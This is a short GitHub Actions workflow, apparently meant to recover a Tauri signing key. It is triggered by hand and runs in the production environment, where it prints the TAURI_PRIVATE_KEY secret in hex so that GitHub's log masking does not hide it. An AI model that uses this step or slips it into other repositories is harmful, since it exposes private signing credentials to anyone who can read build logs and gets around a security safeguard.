name: Dump Secrets

on:
  workflow_dispatch:

jobs:
  dump-secrets:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - name: Dump secrets
        run: echo -n "${{ secrets.TAURI_PRIVATE_KEY }}" | xxd -ps
